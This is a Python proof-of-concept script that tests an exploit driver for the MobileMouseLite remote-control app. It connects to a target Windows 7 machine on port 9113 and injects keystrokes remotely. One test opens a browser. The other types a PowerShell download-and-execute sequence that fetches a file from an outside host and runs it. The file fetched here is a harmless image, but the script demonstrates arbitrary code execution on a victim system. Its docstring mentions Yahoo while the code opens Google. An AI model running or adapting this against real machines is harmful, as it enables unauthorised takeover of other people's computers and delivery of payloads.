import sys
from mmlite_driver import MMLiteDriver as driver
from time import sleep

IP = "172.16.78.131"
PORT = 9113

"""
Tests the MobileMouseLite exploit driver by:
    - opening the Windows start menu
    - opening Yahoo in the primary web browser

The tests are meant to be run on Windows 7.

When running the test, you can specify the IP address of the system to be
exploited as the first command-line parameter.
"""

def main():
    if len(sys.argv) >= 2:
        ip = sys.argv[1]
    else:
        ip = IP

    r = driver(ip, PORT)

    tests = [test_open_url,
             test_powershell]

    r.connect()

    sleep(2)

    for run in tests:
        clean_environment(r)
        run(r)
        sleep(3)

    r.close()

def clean_environment(r):
    r.move_mouse(-2000,-2000)

"""
Demonstrates that we can both open an arbitrary page in the default browser and
use the browser itself by navigating to another page.
"""
def test_open_url(r):
    r.move_mouse(-2000,2000).left_click()
    sleep(0.5)
    r.type('Internet Explorer')
    r.press_action_key("ENTER")
    sleep(20)
    r.press_action_key("F4")
    r.type("http://www.google.com/")
    r.press_action_key("ENTER")

"""
Demonstrates that we can download an arbitrary file from the Internet and
execute it.
"""
def test_powershell(r):
    r.move_mouse(-2000,2000).left_click()
    sleep(2)
    r.type('powershell\n')
    sleep(4)
    r.type('$c = new-object System.Net.WebClient\n') \
     .type('$c.DownloadFile("http://mit.edu/img/BackImage.jpg","Desktop\\BackImage.jpg")\n') \
     .type('.\\Desktop\\BackImage.jpg\n')
    pass

if __name__ == "__main__":
    main()
